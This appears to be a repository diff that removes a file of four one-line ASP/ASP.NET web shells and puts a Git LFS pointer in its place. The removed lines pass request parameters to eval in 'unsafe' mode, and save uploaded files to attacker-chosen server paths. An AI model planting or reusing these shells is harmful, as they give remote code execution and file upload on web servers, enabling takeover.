@@ -1,7 +1,3 @@
-<%@ Page Language="Jscript"%><%eval(Request.Item["pass"],"unsafe");%>
-
-< %@ Page Language="Jscript" validateRequest="false" %><%Response.Write(eval(Request.Item["w"],"unsafe"));%>
-
-<%if (Request.Files.Count!=0) { Request.Files[0].SaveAs(Server.MapPath(Request["f"]) ); }%>
-
-<% If Request.Files.Count <> 0 Then Request.Files(0).SaveAs(Server.MapPath(Request("f")) ) %>
+version https://git-lfs.github.com/spec/v1
+oid sha256:20986666b4c40a0a0b56213d2e059ef628ccc16e22ee382c085efc8f1c9068f6
+size 367
